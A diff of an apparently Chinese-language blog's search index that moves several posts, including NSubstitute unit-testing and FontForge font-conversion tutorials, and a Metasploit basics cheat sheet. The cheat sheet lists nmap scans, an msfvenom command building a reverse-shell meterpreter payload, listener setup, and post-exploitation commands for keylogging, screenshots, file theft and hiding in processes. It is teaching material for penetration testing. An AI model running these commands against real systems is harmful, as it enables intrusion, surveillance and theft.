+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Package</span> NSubstitute</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="類別結構"><a class="header-anchor" href="#類別結構"></a>類別結構</h1>
+<img  src=http://www.plantuml.com/plantuml/svg/LO_T2e9044RlvoackYd8G2z55YiXWgwi5nYt8HTqNTOnwErRfH-x_iuvyEMza9UXRM0XDRUClIFD3LK0BWn66qTMyCB-OJHZbk7gi5dkYYBU9sii1tlkxaQZKlzyoQxhZNJ-EIcddt9aAKXeCZxLIAcPaMAy7SjV562MYqRuBQQO199by1QlL3MC8m-Gixs5Ioy0>
+<h1 id="建立模擬物件"><a class="header-anchor" href="#建立模擬物件"></a>建立模擬物件</h1>
+<p>建立 Repository 的模擬物件</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Repository mockRepository = Substitute.For&lt;Repository&gt;();</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h1 id="注入模擬物件"><a class="header-anchor" href="#注入模擬物件"></a>注入模擬物件</h1>
+<p>把 Repository 的模擬物件注入 Service</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Service service = <span class="keyword">new</span> Service(mockRepository);</span><br></pre></td></tr></table></figure>
+<p>使用 Service</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Table result = service.RunLogic();</span><br><span class="line"></span><br><span class="line">Assert.That(result.Name, Is.EqualTo(<span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
+<h1 id="驗證模擬物件"><a class="header-anchor" href="#驗證模擬物件"></a>驗證模擬物件</h1>
+<p>依傳入參數做回傳</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;張三&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;李四&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">2</span>,</span><br><span class="line">    Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>模擬呼叫方法多次依序回傳不同內容</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">1</span>,</span><br><span class="line">        Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">2</span>,</span><br><span class="line">        Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p>驗證呼叫方法的次數與傳入參數</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.Received(<span class="number">1</span>)</span><br><span class="line">.GetData(Arg.Is&lt;<span class="built_in">string</span>&gt;(x =&gt; x == <span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://nsubstitute.github.io/help.html">NSubstitute文件</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>.Net</category>
+      </categories>
+      <tags>
+        <tag>.Net</tag>
+        <tag>UnitTest</tag>
+        <tag>NSubstitute</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用 SqlPackage 備份資料庫</title>
     <url>/2024/07/25/NetSqlPackage/</url>
     <content><![CDATA[<h1 id="安裝-SqlPackage"><a class="header-anchor" href="#安裝-SqlPackage"></a>安裝 SqlPackage</h1>
@@ -1387,44 +1427,6 @@ dotnet-dump collect --process-id 1902 -->
         <tag>MSSQL</tag>
         <tag>.Net</tag>
         <tag>SqlPackage</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何在商業邏輯層進行單元測試</title>
-    <url>/2022/05/01/NetServiceUnitTest/</url>
-    <content><![CDATA[<h1 id="安裝-NSubstitute"><a class="header-anchor" href="#安裝-NSubstitute"></a>安裝 NSubstitute</h1>
-<p>安裝 Nuget 的 NSubstitute 套件</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Package</span> NSubstitute</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="類別結構"><a class="header-anchor" href="#類別結構"></a>類別結構</h1>
-<img  src=http://www.plantuml.com/plantuml/svg/LO_T2e9044RlvoackYd8G2z55YiXWgwi5nYt8HTqNTOnwErRfH-x_iuvyEMza9UXRM0XDRUClIFD3LK0BWn66qTMyCB-OJHZbk7gi5dkYYBU9sii1tlkxaQZKlzyoQxhZNJ-EIcddt9aAKXeCZxLIAcPaMAy7SjV562MYqRuBQQO199by1QlL3MC8m-Gixs5Ioy0>
-<h1 id="建立模擬物件"><a class="header-anchor" href="#建立模擬物件"></a>建立模擬物件</h1>
-<p>建立 Repository 的模擬物件</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Repository mockRepository = Substitute.For&lt;Repository&gt;();</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<h1 id="注入模擬物件"><a class="header-anchor" href="#注入模擬物件"></a>注入模擬物件</h1>
-<p>把 Repository 的模擬物件注入 Service</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Service service = <span class="keyword">new</span> Service(mockRepository);</span><br></pre></td></tr></table></figure>
-<p>使用 Service</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Table result = service.RunLogic();</span><br><span class="line"></span><br><span class="line">Assert.That(result.Name, Is.EqualTo(<span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
-<h1 id="驗證模擬物件"><a class="header-anchor" href="#驗證模擬物件"></a>驗證模擬物件</h1>
-<p>依傳入參數做回傳</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;張三&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;李四&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">2</span>,</span><br><span class="line">    Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>模擬呼叫方法多次依序回傳不同內容</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">1</span>,</span><br><span class="line">        Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">2</span>,</span><br><span class="line">        Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
-<p>驗證呼叫方法的次數與傳入參數</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.Received(<span class="number">1</span>)</span><br><span class="line">.GetData(Arg.Is&lt;<span class="built_in">string</span>&gt;(x =&gt; x == <span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://nsubstitute.github.io/help.html">NSubstitute文件</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>.Net</category>
-      </categories>
-      <tags>
-        <tag>.Net</tag>
-        <tag>UnitTest</tag>
-        <tag>NSubstitute</tag>
       </tags>
   </entry>
   <entry>
@@ -1547,96 +1549,6 @@ db.create_all() -->
       </tags>
   </entry>
   <entry>
-    <title>使用 Python Script 進行 FontForge 字型檔轉換</title>
-    <url>/2021/10/23/PythonFontForgeTransfer/</url>
-    <content><![CDATA[<h1 id="建立-font-py-檔案"><a class="header-anchor" href="#建立-font-py-檔案"></a>建立 <a href="http://font.py">font.py</a> 檔案</h1>
-<p>使用 python 操作 fontforge 轉換字型檔</p>
-<span id="more"></span>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 載入 FontForge 模組</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定義 main 函數</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():	</span><br><span class="line">	<span class="comment"># 載入參數</span></span><br><span class="line">	fontFilePath = sys.argv[<span class="number">1</span>]	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 開啟字型檔</span></span><br><span class="line">	originFile=fontforge.<span class="built_in">open</span>(fontFilePath)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	originFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 複製字型至剪貼簿</span></span><br><span class="line">	originFile.copy()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 建立新的字型檔</span></span><br><span class="line">	newFile=fontforge.font()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 sfnt_names 參數與原檔一致</span></span><br><span class="line">	newFile.sfnt_names = originFile.sfnt_names	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 encoding 參數與原檔一致</span></span><br><span class="line">	newFile.encoding = originFile.encoding	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 size 參數與原檔一致</span></span><br><span class="line">	newFile.em = originFile.em	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 layers 參數與原檔一致</span></span><br><span class="line">	newFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic = originFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	newFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 貼上剪貼簿內容</span></span><br><span class="line">	newFile.paste()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定字型名稱</span></span><br><span class="line">	newFile.fontname=<span class="string">&quot;EUDC&quot;</span>	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 保存為woff字型</span></span><br><span class="line">	newFile.generate(<span class="string">&quot;EUDC.woff&quot;</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 關閉字型檔</span></span><br><span class="line">	originFile.close()	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行 main 函數</span></span><br><span class="line">main()	</span><br></pre></td></tr></table></figure>
-<h1 id="執行-Python-Script"><a class="header-anchor" href="#執行-Python-Script"></a>執行 Python Script</h1>
-<p>使用 FontForge 執行 Python Script</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fontforge -script font.py [FontFilePath]</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://fontforge.org/docs/scripting/python.html">Python Scripting</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Font</tag>
-        <tag>Python</tag>
-        <tag>FontForge</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit 基本使用</title>
-    <url>/2024/06/01/SecurityMetasploit/</url>
-    <content><![CDATA[<!-- 設定檔位置: ~/.msf4 -->
-<h1 id="開啟-Metasploit-Console"><a class="header-anchor" href="#開啟-Metasploit-Console"></a>開啟 Metasploit Console</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line"><span class="comment"># 資料庫設定: /home/[user]/.msf4/database.yml</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立資料庫連線</span></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止資料庫連線</span></span><br><span class="line">msfdb stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
-<h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新 nmap</span></span><br><span class="line">db_nmap --script-updatedb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 script 掃描漏洞</span></span><br><span class="line"><span class="comment"># script 路徑: /usr/share/nmap/scripts</span></span><br><span class="line">db_nmap -sV --script [漏洞script檔] [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
-<h1 id="模組操作"><a class="header-anchor" href="#模組操作"></a>模組操作</h1>
-<p>⭐ 更新可用模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
-<p>⭐ 顯示可用模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br></pre></td></tr></table></figure>
-<p>⭐ 查找模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
-<p>⭐ 模組使用</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h1 id="payload-基本操作"><a class="header-anchor" href="#payload-基本操作"></a>payload 基本操作</h1>
-<p>⭐ 接口介紹</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">接口</th>
-<th style="text-align:left">說明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">command shell</td>
-<td style="text-align:left">獲得一個命令行界面，允許攻擊者在目標系統上執行命令</td>
-</tr>
-<tr>
-<td style="text-align:left">meterpreter</td>
-<td style="text-align:left">一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等</td>
-</tr>
-<tr>
-<td style="text-align:left">vnc</td>
-<td style="text-align:left">在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面</td>
-</tr>
-</tbody>
-</table>
-<p>⭐ 創建 meterpreter payload :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
-<p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p>⭐ 遠端執行 meterpreter payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
-<h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.metasploit.com/">metasploit</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>Security</tag>
-        <tag>Metasploit</tag>
-        <tag>Nmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>安裝 Whistle</title>
     <url>/2023/01/20/WhistleProxyInstall/</url>
     <content><![CDATA[<h1 id="使用-Node-安裝-Whistle"><a class="header-anchor" href="#使用-Node-安裝-Whistle"></a>使用 Node 安裝 Whistle</h1>
@@ -1661,6 +1573,30 @@ db.create_all() -->
       </categories>
       <tags>
         <tag>Whistle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 Python Script 進行 FontForge 字型檔轉換</title>
+    <url>/2021/10/23/PythonFontForgeTransfer/</url>
+    <content><![CDATA[<h1 id="建立-font-py-檔案"><a class="header-anchor" href="#建立-font-py-檔案"></a>建立 <a href="http://font.py">font.py</a> 檔案</h1>
+<p>使用 python 操作 fontforge 轉換字型檔</p>
+<span id="more"></span>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 載入 FontForge 模組</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定義 main 函數</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():	</span><br><span class="line">	<span class="comment"># 載入參數</span></span><br><span class="line">	fontFilePath = sys.argv[<span class="number">1</span>]	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 開啟字型檔</span></span><br><span class="line">	originFile=fontforge.<span class="built_in">open</span>(fontFilePath)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	originFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 複製字型至剪貼簿</span></span><br><span class="line">	originFile.copy()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 建立新的字型檔</span></span><br><span class="line">	newFile=fontforge.font()</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 sfnt_names 參數與原檔一致</span></span><br><span class="line">	newFile.sfnt_names = originFile.sfnt_names	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 encoding 參數與原檔一致</span></span><br><span class="line">	newFile.encoding = originFile.encoding	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 size 參數與原檔一致</span></span><br><span class="line">	newFile.em = originFile.em	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定 layers 參數與原檔一致</span></span><br><span class="line">	newFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic = originFile.layers[<span class="string">&#x27;Fore&#x27;</span>].is_quadratic	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 選取 unicode 特定範圍的字型</span></span><br><span class="line">	newFile.selection.select((<span class="string">&quot;ranges&quot;</span>, <span class="string">&quot;unicode&quot;</span>), <span class="number">0xe000</span>, <span class="number">0xf8ff</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 貼上剪貼簿內容</span></span><br><span class="line">	newFile.paste()	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 設定字型名稱</span></span><br><span class="line">	newFile.fontname=<span class="string">&quot;EUDC&quot;</span>	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 保存為woff字型</span></span><br><span class="line">	newFile.generate(<span class="string">&quot;EUDC.woff&quot;</span>)	</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 關閉字型檔</span></span><br><span class="line">	originFile.close()	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行 main 函數</span></span><br><span class="line">main()	</span><br></pre></td></tr></table></figure>
+<h1 id="執行-Python-Script"><a class="header-anchor" href="#執行-Python-Script"></a>執行 Python Script</h1>
+<p>使用 FontForge 執行 Python Script</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fontforge -script font.py [FontFilePath]</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://fontforge.org/docs/scripting/python.html">Python Scripting</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Font</tag>
+        <tag>Python</tag>
+        <tag>FontForge</tag>
       </tags>
   </entry>
   <entry>
@@ -1747,6 +1683,72 @@ db.create_all() -->
       </categories>
       <tags>
         <tag>Wsl2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Metasploit 基本使用</title>
+    <url>/2024/06/01/SecurityMetasploit/</url>
+    <content><![CDATA[<!-- 設定檔位置: ~/.msf4 -->
+<h1 id="開啟-Metasploit-Console"><a class="header-anchor" href="#開啟-Metasploit-Console"></a>開啟 Metasploit Console</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line"><span class="comment"># 資料庫設定: /home/[user]/.msf4/database.yml</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立資料庫連線</span></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止資料庫連線</span></span><br><span class="line">msfdb stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
+<h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新 nmap</span></span><br><span class="line">db_nmap --script-updatedb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 script 掃描漏洞</span></span><br><span class="line"><span class="comment"># script 路徑: /usr/share/nmap/scripts</span></span><br><span class="line">db_nmap -sV --script [漏洞script檔] [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
+<h1 id="模組操作"><a class="header-anchor" href="#模組操作"></a>模組操作</h1>
+<p>⭐ 更新可用模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
+<p>⭐ 顯示可用模組</p>
